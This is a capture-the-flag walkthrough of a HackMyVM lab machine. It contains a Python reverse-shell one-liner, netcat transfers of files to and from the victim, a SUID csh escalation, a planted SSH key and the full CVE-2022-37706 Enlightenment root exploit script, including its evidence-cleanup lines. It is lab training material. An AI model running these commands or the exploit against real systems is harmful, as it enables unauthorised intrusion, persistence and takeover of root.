`python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect(("192.168.56.118",4444));[os.dup2(s.fileno(),fd) for fd in(0,1,2)];pty.spawn("/bin/sh")'`

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

```
connect to [192.168.56.118] from (UNKNOWN) [192.168.56.127] 52906 ←
```

![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)

`id`:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`uname -a`:
```
Linux luz 5.15.0-57-generic #63-Ubuntu SMP Thu Nov 24 13:43:17 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

`lsb_release -a`:
```
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.1 LTS
Release:        22.04
Codename:       jammy
```

`ls -alps /var/www/html`:
```
total 16
4 drwxr-xr-x 3 www-data www-data 4096 Jan 11  2023 ./
4 drwxr-xr-x 3 root     root     4096 Jan 11  2023 ../
4 drwxr-xr-x 7 www-data www-data 4096 Jan 11  2023 fos/
4 -rw------- 1 www-data www-data   15 Jan 11  2023 user.txt ←
```

`cat /var/www/html/user.txt`:
```
HMVn03145n4nk4 ←
```

`nc -lvnp 5555 > ./linpeas.sh`:
```
listening on [any] 5555 ... ←
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`cd /home/kali/tools`

`ls -alps`:
```     
total 10060
   4 drwxrwxr-x 2 kali kali    4096 Oct  4 10:08 ./
   4 drwxr-xr-x 8 kali kali    4096 Sep 25 06:08 ../
  56 -rw-r--r-- 1 root root   57344 Apr 11  2023 GodPotato-NET2.exe
  56 -rw-r--r-- 1 root root   57344 Apr 11  2023 GodPotato-NET35.exe
  56 -rw-r--r-- 1 root root   57344 Apr 11  2023 GodPotato-NET4.exe
2156 -rw-r--r-- 1 root root 2204117 Sep 10 10:00 Invoke-Mimikatz.ps1
 340 -rw-rw-r-- 1 kali kali  347648 Sep  9 06:17 JuicyPotato.exe
 844 -rwxr-xr-x 1 kali kali  860337 Sep 20 04:02 linpeas.sh ←
  48 -rw-rw-r-- 1 kali kali   48875 Sep 19 12:45 lse.sh
  60 -rw-r--r-- 1 root root   59392 Sep  9 13:09 nc.exe
  24 -rw-r--r-- 1 root root   22016 Dec  7  2021 PrintSpoofer32.exe
  28 -rw-r--r-- 1 root root   27136 Dec  7  2021 PrintSpoofer64.exe
2872 -rw-rw-r-- 1 kali kali 2940928 Jan 17  2023 pspy32
3032 -rwxrwxr-x 1 kali kali 3104768 Jan 17  2023 pspy64
  52 -rw-r--r-- 1 root root   51712 May 20  2023 RunasCs.exe
  60 -rw-r--r-- 1 root root   61440 May 17  2023 RunasCs_net2.exe
 368 -rw-rw-r-- 1 kali kali  375176 Sep 23 09:43 socat
```

`cat ./linpeas.sh | nc 192.168.56.127 5555 -q 0`

![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)

`ls -l ./linpeas.sh`:
```
-rw-r--r-- 1 www-data www-data 860337 Oct  4 14:10 ./linpeas.sh
```

`chmod u+x ./linpeas.sh`

`./linpeas.sh > ./linpeas_output.txt 2> /dev/null`

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`nc -lvnp 6666 > ./linpeas_output.txt`:
```
listening on [any] 6666 ... ←
```

![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)

`cat ./linpeas_output.txt | nc 192.168.56.118 6666 -q 0`

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

```
connect to [192.168.56.118] from (UNKNOWN) [192.168.56.127] 51218 ←
```

`cat -n ./linpeas_output.txt`:
```
[...]

   544  ╔══════════╣ Users with console
   545  aelis:x:1000:1000:aelis:/home/aelis:/bin/bash                              
   546  root:x:0:0:root:/root:/bin/bash
   547
   548  ╔══════════╣ All users & groups
   549  uid=0(root) gid=0(root) groups=0(root)        
   550  uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
   551  uid=10(uucp) gid=10(uucp) groups=10(uucp)
   552  uid=100(_apt) gid=65534(nogroup) groups=65534(nogroup)
   553  uid=1000(aelis) gid=1000(aelis) groups=1000(aelis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd)

[...]

  1098                        ╔════════════════════════════════════╗
  1099  ══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
  1100                        ╚════════════════════════════════════╝
  1101  ╔══════════╣ SUID - Check easy privesc, exploits and write perms
  1102  ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                    
  1103  -rwsr-xr-- 1 root messagebus 35K Apr  1  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper            
  1104  -rwsr-xr-x 1 root root 23K Feb 11  2022 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd (Unknown SUID binary!)
  1105  -rwsr-xr-x 1 root root 59K Feb 11  2022 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_system (Unknown SUID binary!)
  1106  -rwsr-xr-x 1 root root 23K Feb 11  2022 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys (Unknown SUID binary!) ←
  1107  -rwsr-xr-x 1 root root 331K Nov 23  2022 /usr/lib/openssh/ssh-keysign
  1108  -rwsr-xr-x 1 root root 19K Feb 26  2022 /usr/libexec/polkit-agent-helper-1
  1109  -rwsr-xr-x 1 root root 31K Feb 26  2022 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
  1110  -rwsr-xr-x 1 root root 59K Mar 14  2022 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
  1111  -rwsr-xr-x 1 root root 40K Mar 14  2022 /usr/bin/newgrp  --->  HP-UX_10.20
  1112  -rwsr-xr-x 1 root root 35K Feb 21  2022 /usr/bin/umount  --->  BSD/Linux(08-1996)
  1113  -rwsr-xr-x 1 root root 71K Mar 14  2022 /usr/bin/gpasswd
  1114  -rwsr-xr-x 1 root root 227K Feb 14  2022 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
  1115  -rwsr-xr-x 1 root root 55K Feb 21  2022 /usr/bin/su
  1116  -rwsr-xr-x 1 root root 47K Feb 21  2022 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
  1117  -rwsr-xr-x 1 root root 72K Mar 14  2022 /usr/bin/chfn  --->  SuSE_9.3/10
  1118  -rwsr-xr-x 1 root root 44K Mar 14  2022 /usr/bin/chsh
  1119  -rwsr-sr-x 1 aelis aelis 167K Oct 26  2021 /usr/bin/bsd-csh (Unknown SUID binary!) ←
  1120  -rwsr-xr-x 1 root root 35K Mar 23  2022 /usr/bin/fusermount3
  
[...]
```

<div>
	<img src="C:\Users\nabla\Documents\Obsidian\vault-default\ctf_penetration_testing\hackmyvm\assets\logo_gtfobins.png" alt="GTFOBins Logo" width="16" height="auto">
	<span style="color: white; font-size: 110%;"><strong>GTFOBins</strong></span>
</div>
[csh](https://gtfobins.github.io/gtfobins/csh/)

[**#SUID**]
If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.
This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.
```
sudo install -m =xs $(which csh) .

./csh -b
```

![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)

`/usr/bin/bsd-csh -b`

![Victim: aelis](https://img.shields.io/badge/Victim-aelis-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
aelis ←
```

`id`:
```
uid=33(www-data) gid=33(www-data) euid=1000(aelis) egid=1000(aelis) groups=1000(aelis),33(www-data)
```

`cd /home/aelis`

`ls -alps`:
```
total 12168
    4 drwxr-x--- 5 aelis aelis     4096 Jan 11  2023 ./
    4 drwxr-xr-x 3 root  root      4096 Jan 11  2023 ../
    4 -rw------- 1 aelis aelis       49 Jan 11  2023 .Xauthority
    0 lrwxrwxrwx 1 aelis aelis        9 Jan 11  2023 .bash_history -> /dev/null
    4 -rw-r--r-- 1 aelis aelis      220 Jan  6  2022 .bash_logout
    4 -rw-r--r-- 1 aelis aelis     3771 Jan  6  2022 .bashrc
    4 drwx------ 2 aelis aelis     4096 Jan 11  2023 .cache/
    4 drwxrwxr-x 3 aelis aelis     4096 Jan 11  2023 .local/
    4 -rw-r--r-- 1 aelis aelis      807 Jan  6  2022 .profile
    4 drwx------ 2 aelis aelis     4096 Jan 11  2023 .ssh/ ←
    0 -rw-r--r-- 1 aelis aelis        0 Jan 11  2023 .sudo_as_admin_successful
12132 -rw-r--r-- 1 aelis aelis 12421945 Jan 11  2023 php-fos-db.zip
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`mkdir ./aelis && cd ./aelis`

`ssh-keygen -t rsa -b 4096 -f ./aelis_rsa`:
```
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ./aelis_rsa
Your public key has been saved in ./aelis_rsa.pub
The key fingerprint is:
SHA256:TJ0ljx4RXDKv00ukQKIOl/14EI/H1cZM5EBuGeZjAww kali@kali-vm
The key's randomart image is:
+---[RSA 4096]----+
|      Eooo%O=    |
|     + B.B./=    |
|  . + + * &.=    |
|   +   B = O     |
|    . . S = o    |
|       .   o .   |
|            .    |
|                 |
|                 |
+----[SHA256]-----+
```

`ls -l ./`:
```
total 8
-rw------- 1 kali kali 3381 Oct  4 13:36 aelis_rsa
-rw-r--r-- 1 kali kali  738 Oct  4 13:36 aelis_rsa.pub ←
```

![Victim: aelis](https://img.shields.io/badge/Victim-aelis-64b5f6?logo=linux&logoColor=white)

`nc -lnvp 7777 > ./.ssh/authorized_keys`:
```
Listening on 0.0.0.0 7777 ←
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`cat ./aelis_rsa.pub | nc 192.168.56.127 7777 -q 0`

![Victim: aelis](https://img.shields.io/badge/Victim-aelis-64b5f6?logo=linux&logoColor=white)

```
Connection received on 192.168.56.118 41684 ←
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`searchsploit enlightenment`:
```                   
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Enlightenment - Linux Null PTR Dereference Framework                                                                                                       | linux/local/9627.txt
Enlightenment v0.25.3 - Privilege escalation                                                                                                               | linux/local/51180.txt ←
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

`cat /usr/share/exploitdb/exploits/linux/local/51180.txt`:
```sh
## Exploit Title: Enlightenment v0.25.3 - Privilege escalation
## Author: nu11secur1ty
## Date: 12.26.2022
## Vendor: https://www.enlightenment.org/
## Software: https://www.enlightenment.org/download
## Reference: https://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2022-37706
## CVE ID: CVE-2022-37706 ←
## Description:
The Enlightenment Version: 0.25.3 is vulnerable to local privilege escalation.
Enlightenment_sys in Enlightenment before 0.25.3 allows local users to
gain privileges because it is setuid root,
and the system library function mishandles pathnames that begin with a
/dev/.. substring
If the attacker has access locally to some machine on which the
machine is installed Enlightenment
he can use this vulnerability to do very dangerous stuff.

## STATUS: CRITICAL Vulnerability

[...]

[+] Exploit: ←
---
#!/usr/bin/bash
# Idea by MaherAzzouz
# Development by nu11secur1ty

echo "CVE-2022-37706"
echo "[*] Trying to find the vulnerable SUID file..."
echo "[*] This may take few seconds..."

# The actual problem
file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1) ←
if [[ -z ${file} ]]
then
        echo "[-] Couldn't find the vulnerable SUID file..."
        echo "[*] Enlightenment should be installed on your system."
        exit 1
fi

echo "[+] Vulnerable SUID binary found!"
echo "[+] Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Welcome to the rabbit hole :)"

${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net

read -p "Press any key to clean the evedence..."
echo -e "Please wait... "

sleep 5
rm -rf /tmp/exploit
rm -rf /tmp/net
echo -e "Done; Everything is clear ;)"
---

[...]
```

`vim ./exploit.sh`:
```sh
#!/bin/bash

echo "CVE-2022-37706"
echo "[*] Trying to find the vulnerable SUID file..."
echo "[*] This may take few seconds..."

file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
if [[ -z ${file} ]]
then
	echo "[-] Couldn't find the vulnerable SUID file..."
	echo "[*] Enlightenment should be installed on your system."
	exit 1
fi

echo "[+] Vulnerable SUID binary found!"
echo "[+] Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Enjoy the root shell :)"
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
```

`scp -i ./aelis_rsa ./exploit.sh aelis@192.168.56.127:/home/aelis`:
```
exploit.sh ←
```

`ssh -i ./aelis_rsa aelis@192.168.56.127`:
```
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of vie 04 oct 2024 17:39:52 UTC

  System load:  0.0               Processes:               112
  Usage of /:   61.5% of 7.77GB   Users logged in:         0
  Memory usage: 44%               IPv4 address for enp0s3: 192.168.56.127
  Swap usage:   0%


108 updates can be applied immediately.
56 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Oct  4 17:39:53 2024 from 192.168.56.118
```

![Victim: aelis](https://img.shields.io/badge/Victim-aelis-64b5f6?logo=linux&logoColor=white)

`ls -l`:
```
total 12136
-rw-r--r-- 1 aelis aelis      974 Oct  4 17:23 exploit.sh ←
-rw-r--r-- 1 aelis aelis 12421945 Jan 11  2023 php-fos-db.zip
```

`chmod u+x ./exploit.sh`

`./exploit.sh`:
```
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
mount: /dev/../tmp/: can't find in /etc/fstab.
```

![Victim: root](https://img.shields.io/badge/Victim-root-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
root ←
```

`id`:
```
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),1000(aelis) ←
```

`cd /root`

`ls -alps`:
```
total 40
4 drwx------  6 root root  4096 Oct  4 17:44 ./
4 drwxr-xr-x 19 root root  4096 Jan 11  2023 ../
0 lrwxrwxrwx  1 root root     9 Jan 11  2023 .bash_history -> /dev/null
4 -rw-r--r--  1 root root  3106 Oct 15  2021 .bashrc
4 drwxr-xr-x  3 root root  4096 Jan 11  2023 .local/
4 -rw-------  1 root root   520 Jan 11  2023 .mysql_history
4 -rw-r--r--  1 root root   161 Jul  9  2019 .profile
4 drwx------  2 root aelis 4096 Oct  4 17:44 .run/
4 drwx------  2 root root  4096 Jan 11  2023 .ssh/
4 -rw-------  1 root root    17 Jan 11  2023 root.txt ←
4 drwx------  3 root root  4096 Jan 11  2023 snap/
```

`cat ./root.txt`:
```
HMV3nl1gth3nm3n7 ←
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
